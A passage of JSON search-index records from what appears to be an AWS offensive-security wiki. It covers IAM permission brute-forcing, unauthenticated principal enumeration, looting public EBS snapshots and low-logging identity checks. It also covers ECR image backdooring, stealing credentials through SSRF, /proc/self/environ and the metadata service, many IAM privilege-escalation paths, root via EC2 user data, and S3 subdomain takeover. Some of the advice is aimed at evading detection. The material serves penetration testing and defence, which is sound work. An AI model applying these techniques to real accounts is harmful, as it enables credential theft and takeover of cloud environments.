$AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN\n2020-12-20 18:41:26,375 - 13 - [INFO] Starting permission enumeration for access-key-id \"ASIAAAAAAAAAAAAAAAAA\"\n2020-12-20 18:41:26,812 - 13 - [INFO] -- Account ARN : arn:aws:sts::012345678912:assumed-role/role-b/user-b\n2020-12-20 18:41:26,812 - 13 - [INFO] -- Account Id  : 012345678912\n2020-12-20 18:41:26,813 - 13 - [INFO] -- Account Path: assumed-role/role-b/user-b\n2020-12-20 18:41:27,283 - 13 - [INFO] Attempting common-service describe / list brute force.\n2020-12-20 18:41:34,992 - 13 - [INFO] -- codestar.list_projects() worked!\n2020-12-20 18:41:35,928 - 13 - [INFO] -- sts.get_caller_identity() worked!\n2020-12-20 18:41:36,838 - 13 - [INFO] -- dynamodb.describe_endpoints() worked!\n2020-12-20 18:41:38,107 - 13 - [INFO] -- sagemaker.list_models() worked!\n</code></pre>","location":"aws/enumeration/brute_force_iam_permissions/"},{"title":"Updating APIs","text":"<p>With an attack surface that evolves as rapidly as AWS, we often have to find and abuse newer features. This is one area where enumerate-iam shines. The tool itself has a built in feature to read in new AWS API calls from the JavaScript SDK, and use that information to brute force. After downloading enumerate-iam, perform the following steps to update the API lists.</p> <pre><code>cd enumerate_iam/\ngit clone https://github.com/aws/aws-sdk-js.git\npython generate_bruteforce_tests.py\n</code></pre> <p>This will create or update a file named bruteforce_tests.py under enumerate-iam.</p>","location":"aws/enumeration/brute_force_iam_permissions/#updating-apis"},{"title":"OPSEC Considerations","text":"<p>One thing to note is that this tool is very noisy and will generate a ton of CloudTrail logs. This makes it very easy for a defender to spot this activity and lock you out of that role or user. Try other methods of permission enumeration first, or be willing to lose access to these credentials before resorting to brute-force. </p>","location":"aws/enumeration/brute_force_iam_permissions/#opsec-considerations"},{"title":"Unauthenticated Enumeration of IAM Users and Roles","text":"<p>Original Research: Daniel Grzelak - Remastered Talk by Scott Piper Additional Reading: Rhino Security Link to Quiet Riot: Github Link to Tool: GitHub Link to Pacu Module: GitHub </p> <p>You can enumerate Account IDs, root account e-mail addresses, IAM roles, IAM users, and a partial account footprint by abusing Resource-Based Policies.</p> <p>There are a few ways to do this, for example, Pacu's module will attempt to change the AssumeRole policy of a role in your account and specify a role in another account. Quiet Riot offers a scalable method for enumerating each of these items with configurable wordlists per item type.</p> <p>Another way would be to use S3 Bucket Policies. Take the following example:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"Example permissions\",\n            \"Effect\": \"Deny\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::123456789123:role/role_name\"\n            },\n            \"Action\": \"s3:ListBucket\",\n            \"Resource\": \"arn:aws:s3:::*bucket you own*\"\n        }\n    ]\n}\n</code></pre> <p>You would apply this policy to a bucket you own. By specifying a principal in the target account (123456789123), you can determine if that principals exists. If setting the bucket policy succeeds you know the role exists. If it fails you know the role does not.</p>  <p>Warning</p> <p>Doing either of these techniques will generate a lot of CloudTrail events, specifically UpdateAssumeRolePolicy or PutBucketPolicy in your account. If your intention is to be stealthy it is not advised (or required) to use a target's credentials. Instead you should use your own account (the CloudTrail events will be generated there).</p>   <p>Note</p> <p>While this works for both IAM users and roles, this will also work with service-linked roles. This will allow you to enumerate various services the account uses, such as GuardDuty or Organizations.</p>  <p>To automate this process you can use the Pacu Module or this which will attempt to brute force it for you.</p> <pre><code>usage: main.py [-h] --id ID --my_bucket MY_BUCKET [--wordlist WORDLIST] (--role | --user)\n\nEnumerate IAM/Users of an AWS account. You must provide your OWN AWS account and bucket\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --id ID               The account id of the target account\n  --my_bucket MY_BUCKET\n                        The bucket used for testing (belongs to you)\n  --wordlist WORDLIST   Wordlist containers user/role names\n  --role                Search for a IAM Role\n  --user                Search for a IAM User\n</code></pre>","location":"aws/enumeration/enum_iam_user_role/"},{"title":"Get Account ID from AWS Access Keys","text":"<p>While performing an assessment in AWS it is not uncommon to come across access keys and not know what account they are associated with. If your scope is defined by the AWS account ID, this may pose a problem as you'd likely not want to use them if they are out of scope.</p> <p>To solve this problem you can use sts:GetAccessKeyInfo to return the account ID of the credentials. This action will only be logged to the account calling the action (which should be your account, not the target's).</p> <pre><code>user@host:~$ aws sts get-access-key-info --access-key-id=ASIA1234567890123456\n{\n    \"Account\": \"123456789012\"\n}\n</code></pre>","location":"aws/enumeration/get-account-id-from-keys/"},{"title":"Loot Public EBS Snapshots","text":"<p>For EC2 instances, files and data are typically stored in Elastic Block Store (EBS) volumes. These virtual hard drives make it easy to attach and move data between your virtual machines. As an additional feature, you can create snapshots of those volumes, which you can use for backups or replication. An important security consideration of these snapshots is that they can be (accidentally or otherwise) made public, accessible for anyone to access and steal the contents of the snapshot.</p>","location":"aws/enumeration/loot_public_ebs_snapshots/"},{"title":"Making them Public","text":"<p>EBS Snapshots have two availability settings, Private and Public. It is important to note that EBS does not utilize resource-based policies. If a snapshot is made public via the console or through Infrastructure as Code, it will be available to anyone with no additional controls.</p> <p></p>","location":"aws/enumeration/loot_public_ebs_snapshots/#making-them-public"},{"title":"Finding Exposed Snapshots","text":"<p>A lot of instances of resource exposure (and subsequent exploitation) in AWS require knowing the ARN of the resource. This provides some level of security-by-obscurity, as the attacker needs to find the ARN through some means (In some cases this can also apply to vulnerabilities in AWS services themselves).</p> <p>A somewhat unique trait of EBS snapshots is that, if they are set to public, the list of those EBS snapshots is publicly available through the AWS API. From the EC2 section in the AWS console, navigate to Elastic Block Store, Snapshots, and select <code>Public snapshots</code> from the drop down. This will show all publicly available EBS snapshots (you may have to scroll through to see an accurate count).</p> <p></p> <p>To pull this list in an easily consumable format you can use the following CLI command:</p> <pre><code>aws ec2 describe-snapshots --restorable-by-user-ids all\n</code></pre> <p>As of the time of this writing there are tens of thousands of snapshots exposed. As a bonus, it is possible to filter this list by account ID, allowing you to easily target specific accounts.</p>  <p>Tip</p> <p>This can be an easy, free (in terms of detection) check to look out for when exploiting AWS environments. If you steal IAM credentials, you can determine the account they are tied to and check for exposed EBS snapshots.</p>  <p>To search for all public EBS snapshots associated with an AWS account, use the following command:</p> <pre><code>aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids 000000000000\n</code></pre>","location":"aws/enumeration/loot_public_ebs_snapshots/#finding-exposed-snapshots"},{"title":"Identification","text":"<p>To find exposed EBS snapshots in your account you can use automated tooling such as Prowler, an open source tool to audit for AWS security. The following command can be used with version 3.0 or higher.</p> <pre><code>./prowler -c ec2_ebs_public_snapshot\n</code></pre>","location":"aws/enumeration/loot_public_ebs_snapshots/#identification"},{"title":"Detection","text":"<p>When someone makes an EBS snapshot publicly accessible, CloudTrail generates an <code>ec2:ModifySnapshotAttribute</code> event with <code>createVolumePermission</code> set to <code>{\"add\": {\"items\": [{ \"groups\": \"all\" }]}}</code>. You can use Stratus Red Team's aws.exfiltration.ec2-share-ebs-snapshot to reproduce the issue and test your detections.</p>","location":"aws/enumeration/loot_public_ebs_snapshots/#detection"},{"title":"Additional Resources","text":"<p>For additional information on the risks of exposed EBS snapshots, check out this DEF CON 27 talk, <code>Finding Secrets In Publicly Exposed EBS Volumes</code> by Ben Morris (slides available here).</p>","location":"aws/enumeration/loot_public_ebs_snapshots/#additional-resources"},{"title":"Whoami - Get Principal Name From Keys","text":"<p>After finding or stealing IAM credentials during an assessment you will need to identify what they are used for, or if they are valid. The most common method for doing so would be the get-caller-identity API call. This is beneficial for a few reasons, in particular that it requires no special permissions to call.</p> <p>Unfortunately (while unlikely) there is the possibility that this API call may be monitored for sensitive accounts. Additionally, if our goal is to be as stealthy as possible we may not want to use this. As a result we need alternatives. The good news for us is that a lot of AWS services will disclose the calling role along with the account ID as a result of an error. The following is certainly not a comprehensive list, and note that the principal needs to NOT have IAM permissions to make this call to return the information as an error.</p> <p>Not all API calls exhibit this behavior. Failed EC2 API calls, for example, will return a variant of the following.</p> <pre><code>An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.\n</code></pre>","location":"aws/enumeration/whoami/"},{"title":"sns publish","text":"<p>sns:Publish will return the ARN of the calling user/role without logging to CloudTrail. To use this method, you must provide a valid AWS account id in the API call. This can be your own account id, or the account id of anyone else.</p> <pre><code>user@host:~$ aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa\n\nAn error occurred (AuthorizationError) when calling the Publish operation: User: arn:aws:iam::123456789123:user/no-perm is not authorized to perform: SNS:Publish on resource: arn:aws:sns:us-east-1:*account id*:aaa because no resource-based policy allows the SNS:Publish action\n</code></pre>","location":"aws/enumeration/whoami/#sns-publish"},{"title":"Abusing Elastic Container Registry for Lateral Movement","text":"<p>Original Research: Roi Lavie - [Abusing Elastic Container Registry (ECR) to own AWS environments]</p> <p>Required IAM Permission: [read and write access to ECR registry]</p> <p>IAM (Identity and Access Management) is a set of consents that attach to identities, or cloud resources, to authorize what they can actually do. This means EC2 resources, and others like it, also have identities that can change the infrastructure itself. 43.9% of organizations have internet-facing workloads containing secrets and credentials, as a result, identity and access management (IAM) has become more critical than ever.</p>  <p></p>  <p>This post is designed to show the impact of this attack technique and help security engineers and DevOps/SecOps to detect and understand the risks of ECR and other Container registries.</p> <p>Lateral Movement through AWS ECR In the following video, I will show how by using ECR permissions you can easily distribute a backdoor to production servers, developer's laptops, or CI/CD pipelines and own the environment by gaining privileged permissions.</p>   <p>Video Summary:</p> <ul> <li>An attacker\u2019s initial access can be through vulnerable applications (e.g SSRF), misconfiguration, leaked access keys, developer laptops, and more.</li> <li>The attacker gains access to resources using access to ECR</li> <li>The attacker pulls the latest docker image</li> <li>The attacker adds a layer by injecting a malicious payload to the docker image</li> <li>The attacker pushes the docker image to ECR with the latest tag</li> <li>The victim pulls the latest docker image and starts the container</li> <li>The malicious reverse shell is executed and communicates with the attacker</li> <li>The attacker steals the server's IAM credentials   (A reverse shell is an example of a simple payload but noisy technique. An attacker can inject the ECR with other techniques e.g. a hidden backdoor)</li> </ul> <p>Security Recommendations:</p> <ul> <li>Least privileges \u2014 external facing apps should not have write access or wildcard (*) permissions on ECR</li> <li>Secure CI/CD pipelines \u2014 Protect from any unauthorized access to source code repos or build tools.</li> <li>Enforce signing of docker images</li> <li>(see: https://github.com/notaryproject/notary)</li> <li>Use docker custom security profiles like AppArmor, Seccomp</li> <li>Audit and monitor access and actions on ECR using AWS CloudTrail   (If you use Container Image scanning, be aware that it will only detect the vulnerabilities of the system and will not be able to detect malicious payloads within the containers)</li> </ul> <p>Conclusions: One of the main reasons I wrote this post is to share knowledge about the importance of container registry access, especially around ECR. Although this issue poses a high risk, it is not given the required attention it deserves. More awareness is needed around the potential damage that over-privileged services can introduce.</p>","location":"aws/exploitation/abusing-container-registry/"},{"title":"Steal EC2 Metadata Credentials via SSRF","text":"<p>Note</p> <p>This is a common and well known attack in AWS environments. Mandiant has identified attackers performing automated scanning of vulnerabilities to harvest IAM credentials from publicly-facing web applications. To mitigate the risks of this for your organization, it would be beneficial to enforce IMDSv2 for all EC2 instances which has additional security benefits. IMDSv2 would significantly reduce the risk of an adversary stealing IAM credentials via SSRF.</p>  <p>One of the most commonly taught tactics in AWS exploitation is the use of Server Side Request Forgery (SSRF) to access the EC2 metadata service.</p> <p>Most EC2 Instances have access to the metadata service at 169.254.169.254. This contains useful information about the instance such as its IP address, the name of the security group, etc. On EC2 instances that have an IAM role attached the metadata service will also contain IAM credentials to authenticate as this role. Depending on what version of IMDS is in place, and what capabilities the SSRF has we can steal those credentials.</p> <p>It is also worth noting that shell access to the EC2 instance would also allow an adversary to gather these credentials.</p> <p>In this example there is a web server running on port 80 of the EC2 instance. This web server has a simple SSRF vulnerability, allowing us to make GET requests to arbitrary addresses. We can leverage this to make a request to <code>http://169.254.169.254</code>.</p>  <p></p>  <p>To determine if the EC2 instance has an IAM role associated with it, look for http://169.254.169.254/latest/meta-data/iam/. A 404 response indicates there is no IAM role associated. You may also get a 200 response that is empty, this indicates that there was an IAM Role however it has since been revoked.</p> <p>If there is a valid role you can steal, make a request to http://169.254.169.254/latest/meta-data/iam/security-credentials/. This will return the name of the IAM role the credentials represent. In the example below we see that the role name is 'ec2-default-ssm'.</p>  <p></p>  <p>To steal the credentials, append the role name to your previous query. For example, with the name above we'd query http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/.</p>  <p></p>  <p>These credentials can then be used in the AWS CLI or other means to make API calls as the IAM role.</p>","location":"aws/exploitation/ec2-metadata-ssrf/"},{"title":"AWS IAM Privilege Escalation Techniques","text":"<p>Original Research: Spencer Gietzen - AWS IAM Privilege Escalation Further Reading: AWS-IAM-Privilege-Escalation Further Reading: Investigating PrivEsc Methods in AWS </p>  <p>Note</p> <p>If you'd like to get hands on experience exploiting these misconfigurations, check out iam-vulnerable by Seth Art.</p>","location":"aws/exploitation/iam_privilege_escalation/"},{"title":"codestar:CreateProject, codestar:AssociateTeamMember","text":"<p>With access to the codestar:CreateProject and codestar:AssociateTeamMember permissions, an adversary can create a new CodeStar project and associate themselves as an Owner of the project.</p> <p>This will attach a new policy to the user that provides access to a number of permissions for AWS services. This is most useful for further enumeration as it gives access to lambda:List*, iam:ListRoles, iam:ListUsers, and more.</p>  <p></p>   <p></p>","location":"aws/exploitation/iam_privilege_escalation/#codestarcreateproject-codestarassociateteammember"},{"title":"glue:UpdateDevEndpoint","text":"<p>With access to the glue:UpdateDevEndpoint permission, an adversary can update the existing SSH key associated with the glue endpoint. This will allow the adversary to SSH into the host and gain access to IAM credentials associated with the role attached to the glue endpoint. Though not required, it may be helpful to have the glue:GetDevEndpoint permission as well, if the existing endpoint cannot be identified via other means. </p>","location":"aws/exploitation/iam_privilege_escalation/#glueupdatedevendpoint"},{"title":"iam:AddUserToGroup","text":"<p>With access to the iam:AddUserToGroup permission, an adversary can add an IAM user they control to an existing group with more privileges. Although this is not required, it may be helpful to have other permissions in the IAM family to identify other groups and their privileges. </p>","location":"aws/exploitation/iam_privilege_escalation/#iamaddusertogroup"},{"title":"iam:AttachGroupPolicy","text":"<p>With access to the iam:AttachGroupPolicy permission, an adversary can attach an IAM policy to a group they are a member of. This potentially includes policies such as AdministratorAccess, which would provide them (surprise) administrator access to the AWS account.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamattachgrouppolicy"},{"title":"iam:AttachRolePolicy","text":"<p>With access to the iam:AttachRolePolicy permission, an adversary can attach an IAM policy to a role they have access to. This potentially includes policies such as AdministratorAccess, which would provide them administrator access to the AWS account.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamattachrolepolicy"},{"title":"iam:AttachUserPolicy","text":"<p>With access to the iam:AttachUserPolicy permission, an adversary can attach an IAM policy to an IAM user they have access to. This potentially includes policies such as AdministratorAccess, which would provide them administrator access to the AWS account.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamattachuserpolicy"},{"title":"iam:CreateAccessKey","text":"<p>With access to the iam:CreateAccessKey permission, an adversary can create an IAM Access Key and Secret Access Key for other users. This would allow them to create credentials for more privileged users and have access to their privileges.</p>  <p></p>","location":"aws/exploitation/iam_privilege_escalation/#iamcreateaccesskey"},{"title":"iam:CreateLoginProfile","text":"<p>With access to the iam:CreateLoginProfile permission, an adversary can create a password for a more privileged IAM user to login to the console as. Note: if a password is already set, you must use iam:UpdateLoginProfile instead.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamcreateloginprofile"},{"title":"iam:CreatePolicyVersion","text":"<p>With access to the iam:CreatePolicyVersion permission, an adversary can create a new version of a existing policy with more privilege. If the adversary has access to the principal that policy is attached to, they can elevate their privileges.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamcreatepolicyversion"},{"title":"iam:PassRole, cloudformation:CreateStack","text":"<p>With access to the iam:PassRole and cloudformation:CreateStack permissions, an adversary can create a new CloudFormation stack and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-cloudformationcreatestack"},{"title":"iam:PassRole, codestar:CreateProject","text":"<p>With access to the iam:PassRole and codestar:CreateProject permissions, an adversary can create a new CodeStar project and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role including that of an administrator.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-codestarcreateproject"},{"title":"iam:PassRole, datapipeline:ActivatePipeline, datapipeline:CreatePipeline, datapipeline:PutPipelineDefinition","text":"<p>With access to the iam:PassRole, datapipeline:ActivatePipeline, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions, an adversary can create a new pipeline and pass in a more privileged role. It is worth noting that to do this the AWS account must already contain a role that can be assumed by DataPipeline and that role must have greater privileges (or at least different ones) than the principal the adversary controls.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-datapipelineactivatepipeline-datapipelinecreatepipeline-datapipelineputpipelinedefinition"},{"title":"iam:PassRole, ec2:RunInstances","text":"<p>With access to the iam:PassRole and ec2:RunInstances permissions, an adversary can create a new EC2 instance and pass a more privileged role to it.</p> <p>This can be taken advantage of with the following one-liner:</p>  <p></p>  <p>Some things to note: The instance profile must already exist, and (realistically) it must have greater permissions than the role you have access to. If you also have the ability to create a role, this can be leveraged (although you may as well set the trust policy of that role to one you control at that point). The role that is being passed must have a trust policy allowing the EC2 service to assume it. You cannot pass arbitrary roles to an EC2 instance.</p> <p>A common misconception about this attack is that an adversary must have access to an existing SSH key, or be able to spawn an SSM session. This is not actually true, you can leverage user data to perform an action on the host. One common example is to have the EC2 instance curl the metadata service, retrieve the IAM credentials, and then send them to an attacker controlled machine using curl.</p> <p>Another (stealthier) example would be to perform all your API operations at once in the user-data script. This way you are not dinged with the IAM credential exfiltration finding (which can be bypassed).</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-ec2runinstances"},{"title":"iam:PassRole, glue:CreateDevEndpoint","text":"<p>With access to the iam:PassRole and glue:CreateDevEndpoint permissions, an adversary can create a new Glue development endpoint and pass in a more privileged role. It is worth noting that to do this the AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-gluecreatedevendpoint"},{"title":"iam:PassRole, glue:CreateJob","text":"<p>With access to the iam:PassRole and glue:CreateJob permissions, an adversary can create a new Glue job and pass in a more privileged role. The AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls. The glue:StartJobRun privilege would allow for the job to be run.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-gluecreatejob"},{"title":"iam:PassRole, glue:UpdateJob","text":"<p>With access to the iam:PassRole and glue:UpdateJob permissions, an adversary can update the role and command associated with a Glue job. The AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls. The glue:StartJobRun privilege or some pre-existing trigger could cause the job to run.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-glueupdatejob"},{"title":"iam:PassRole, lambda:AddPermission, lambda:CreateFunction","text":"<p>With access to the iam:PassRole, lambda:AddPermission, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing role. This function could then by updated with lambda:AddPermission to allow another principal in another AWS account the permission to invoke it. It is worth noting that the AWS account must already contain a role that can be assumed by Lambda.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdaaddpermission-lambdacreatefunction"},{"title":"iam:PassRole, lambda:CreateEventSourceMapping, lambda:CreateFunction","text":"<p>With access to the iam:PassRole, lambda:CreateEventSourceMapping, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing privileged role and associating it with a DynamoDB table. Then, when a new record is inserted into the table, the Lambda function will trigger with the privilege of the passed in role.</p> <p>It is worth noting that the AWS account must already contain a role that can be assumed by Lambda. Additionally, while not required, it may be beneficial to have the dynamodb:CreateTable and dynamodb:PutItem permissions to trigger this yourself.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdacreateeventsourcemapping-lambdacreatefunction"},{"title":"iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction","text":"<p>With access to the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions, an adversary can create a new Lambda function and pass an existing role to it. They can then invoke the function allowing them access to the privileges of the role associated with the function. It is worth noting that unless the adversary can create a role, they must use an already existing role that can be assumed by Lambda.</p>","location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdacreatefunction-lambdainvokefunction"},{"title":"iam:PutGroupPolicy","text":"<p>With access to the iam:PutGroupPolicy permission, an adversary can create an inline policy for a group they are in and give themselves administrator access to the AWS account.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamputgrouppolicy"},{"title":"iam:PutRolePolicy","text":"<p>With access to the iam:PutRolePolicy permission, an adversary can create an inline policy for a role they have access to and give themselves administrator access to the AWS account.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamputrolepolicy"},{"title":"iam:PutUserPolicy","text":"<p>With access to the iam:PutUserPolicy permission, an adversary can create an inline policy for a user they have access to and give themselves administrator access to the AWS account.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamputuserpolicy"},{"title":"iam:SetDefaultPolicyVersion","text":"<p>With access to the iam:SetDefaultPolicyVersion permission, an adversary can revert a policy associated with their principal to a previous version. This is useful for scenarios in which a previous version of a policy had more access than the current version.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamsetdefaultpolicyversion"},{"title":"iam:UpdateAssumeRolePolicy","text":"<p>With access to the iam:UpdateAssumeRolePolicy permission, an adversary can modify the assume-role policy of a role, allowing them to assume it. This is useful to gain access to administrator roles, or other more privileged roles.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamupdateassumerolepolicy"},{"title":"iam:UpdateLoginProfile","text":"<p>With access to the iam:UpdateLoginProfile permission, an adversary can change the password of an IAM user. This would allow them to log into the console as that user.</p>","location":"aws/exploitation/iam_privilege_escalation/#iamupdateloginprofile"},{"title":"lambda:UpdateFunctionCode","text":"<p>With access to the lambda:UpdateFunctionCode permission, an adversary can modify an existing Lambda function's code. This would allow them to gain access to the privileges of the associated IAM role the next time the function is executed.</p>","location":"aws/exploitation/iam_privilege_escalation/#lambdaupdatefunctioncode"},{"title":"lambda:UpdateFunctionConfiguration","text":"<p>With access to the lambda:UpdateFunctionConfiguration permission, an adversary can modify an existing Lambda function's configuration to add a new Lambda Layer. This Layer would then override an existing library and allow an adversary to execute malicious code under the privilege of the role associated with the Lambda function.</p>","location":"aws/exploitation/iam_privilege_escalation/#lambdaupdatefunctionconfiguration"},{"title":"Steal IAM Credentials and Event Data from Lambda","text":"<p>In Lambda, IAM credentials are passed into the function via environment variables. The benefit for the adversary is that these credentials can be leaked via file read vulnerabilities such as XML External Entity attacks or SSRF that allows the file protocol. This is because \"everything is a file\".</p> <p>IAM credentials can be accessed via reading <code>/proc/self/environ</code>.</p>  <p></p>   <p>Note</p> <p>In the event that /proc/self/environ is blocked by a WAF, check if you can read the environment variables of other processes. This can be done by reading /proc/#/environ where '#' is some number often between 1 and 20.</p>  <p>In addition to IAM credentials, Lambda functions also have event data that is passed to the function when it is started. This data is made available to the function via the runtime interface. Unlike IAM credentials, this data is accessible over standard SSRF at <code>http://localhost:9001/2018-06-01/runtime/invocation/next</code>.</p> <p>This will include information about what invoked the Lambda function and may be valuable depending on the context.</p>  <p>Note</p> <p>Unlike IAM credentials associated with EC2 instances, there is no GuardDuty alert for stolen Lambda credentials.</p>","location":"aws/exploitation/lambda-steal-iam-credentials/"},{"title":"Local Privilege Escalation: User Data","text":"<p>Required IAM Permission: modify-instance-attribute Recommended but not required: start-instances, describe-instances, stop-instances (makes things go faster, requires less enumeration. The instance must be stopped to alter the user data)  </p> <p>If an adversary has access to the modify-instance attribute permission they can leverage it to escalate to root/System on an EC2 instance.</p> <p>Usually, user data scripts are only run the first time the instance is started, however this can be changed using cloud-init to run every time the instance restarts.</p> <p>To do this, first create a file in the following format.</p> <pre><code>Content-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config.txt\"\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"userdata.txt\"\n\n#!/bin/bash\n**commands here**\n--//\n</code></pre> <p>Modify the <code>commands here</code> section to do whatever action you want. Setting a reverse shell, adding an ssh key to the default user, etc. are all good options.</p> <p>Once you've done that, convert the file to base64. Linux can do this with the following command.</p> <p><code>base64 file.txt &gt; file.b64.txt</code></p> <p>Windows can do this with the following command.</p> <p><code>certutil -encode file.txt tmp.b64 &amp;&amp; findstr /v /c:- tmp.b64 &gt; file.b64.txt</code></p> <p>Now that you've base64 encoded your payload, you will leverage the modify-instance-attribute API call to change the user data of the target instance. Note: the instance will need to be stopped to modify its user data. You'll either have to stop it yourself, or wait for something else to stop it.</p> <pre><code>aws ec2 modify-instance-attribute \\\n--instance-id=xxx \\\n--attribute userData \\\n--value file://file.b64.txt\n</code></pre> <p>With that change made, simply start the instance again and your command will be executed with root/System.</p>","location":"aws/exploitation/local-priv-esc-mod-instance-att/"},{"title":"Local Privilege Escalation: User Data 2","text":"<p>A common pattern when using EC2 is to define a user data script to be run when an instance is first started or after a reboot. These scripts are typically used to install software, download and set a config, etc. Oftentimes the scripts and packages are pulled from S3 and this introduces an opportunity for a developer/ops person to make a mistake.</p> <p>If the IAM role is too permissive and allows the role to write to that location, an adversary can leverage this for privilege escalation. Additionally, if there is any other kind of misconfiguration on the bucket itself, or another role which has access gets compromised, an adversary can take advantage of this as well.</p> <p>Take the following user data script:</p> <pre><code>#!/bin/bash\naws s3 cp s3://example-boot-bucket/start_script.sh /root/start_script.sh\nchmod +x /root/start_script.sh\n/root/start_script.sh\n</code></pre> <p>On first launch, the EC2 instance will pull the start_script from S3 and will run it. If an adversary can write to that location, they can escalate privileges or gain control of the EC2 instance.</p>  <p>Note</p> <p>In addition to new instances being spun up or after a reboot, poisoning the scripts/applications can also effect EC2 instances in an Auto Scaling Group.</p>","location":"aws/exploitation/local-priv-esc-user-data-s3/"},{"title":"Simple Route53/Cloudfront/S3 Subdomain Takeover","text":"<p>Research Example: Patrik Hudak Link to Tool: dwatch Link to Tool: ctfr Link to Tool: Amass </p> <p>Utilizing various enumeration techniques for recon and enumeration, an attacker can discover orphaned Cloudfront distributions and/or DNS Records that are attempting to serve content from an S3 bucket that no longer exists. There are numerous tools to do this, but I have been using dwatch combined with CTFR. </p> <p>Essentially you need a list of domains to check. Create a domain list using CTFR or amass or the like, and then utilize a tool like dwatch to test each host to look for a specific error page that contains the text \"NoSuchBucket\".</p> <pre><code>&lt;Error&gt;\n&lt;Code&gt;NoSuchBucket&lt;/Code&gt;\n&lt;Message&gt;The specified bucket does not exist&lt;/Message&gt;\n&lt;BucketName&gt;hackingthe.cloud&lt;/BucketName&gt;\n&lt;RequestId&gt;68M9C1KTARF9FBYN&lt;/RequestId&gt;\n&lt;HostId&gt;RpbdvVU9AXidVVI/1zD+WTwYdVI5YMqQNJShmf6zJlztBVyINq8TtqbzWpThdi/LivlOWRVCPVs=&lt;/HostId&gt;\n&lt;/Error&gt;\n</code></pre> <p>The simple next step is to go create a bucket with this name in S3. </p> <p>This alone can be enough to stop the bucket from being taken over by anyone else. However, you may want to place some POC code in an index.html or any html file in the root directory of the bucket file.</p> <pre><code>&lt;h1&gt; Simple PoC for Subdomain Takeover,&lt;/h1&gt;\n&lt;button onclick=alert(document.domain)&gt; XSS Alert for PoC &lt;/button&gt;\n&lt;h2&gt; demo purposes only. &lt;/h2&gt; \n</code></pre> <p>Root Causes of this issue are typically due to a hygiene realted issues where an S3 bucket was deleted while content was still being served by Cloudfront or by a DNS Record CNAME (Route53 or otherwise).  </p> <p>There are other nuanced conditions with Cloudfront, although rare, that can cause the similar takeover susceptibility.</p> <p>To protect against this type of attack utilize robust hygiene practices:</p> <p>Always create in this order S3 -&gt; Cloudfront -&gt; DNS</p> <p>Always Sunset/Delete in this order DNS -&gt; Cloudfront-&gt; S3</p> <p>Likewise, if you are testing, and something doesn't work, dont forget to clean up!</p>","location":"aws/exploitation/orphaned_%20cloudfront_or_dns_takeover_via_s3/"},{"title":"AWS API Call Hijacking via ACM-PCA","text":"<p>Original Research: niebardzo - Hijacking AWS API Calls </p> <p>Required IAM Permission: route53:CreateHostedZone, route53:ChangeResourceRecordSets, acm-pca:IssueCertificate, acm-pca:GetCertificate Recommended but not required: route53:GetHostedZone, route53:ListHostedZones, acm-pca:ListCertificateAuthorities, ec2:DescribeVpcs (may be useful for enumeration, but are not requires as the info can be enumerated in other ways)  </p>  <p>Note</p> <p>To perform this attack the target account must already have an AWS Certificate Manager Private Certificate Authority (AWS-PCA) setup in the account, and EC2 instances in the VPC(s) must have already imported the certificates to trust it. With this infrastructure in place, the following attack can be performed to intercept AWS API traffic.</p>  <p>Assuming there is an AWS VPC with multiple cloud-native applications talking to each other and to AWS API. Since the communication between the microservices is often TLS encrypted there must be a private CA to issue the valid certificates for those services. If ACM-PCA is used for that and the adversary manages to get access to control both route53 and acm-pca private CA with the minimum set of permissions described above, it can hijack the application calls to AWS API taking over their IAM permissions.</p> <p>This is possible because:  </p> <ul> <li>AWS SDKs do not have Certificate Pinning</li> <li>Route53 allows creating Private Hosted Zone and DNS records for AWS APIs domain names</li> <li>Private CA in ACM-PCA cannot be restricted to signing only certificates for specific Common Names</li> </ul> <p>For example, Secrets Manager in us-east-1 could be re-routed by an 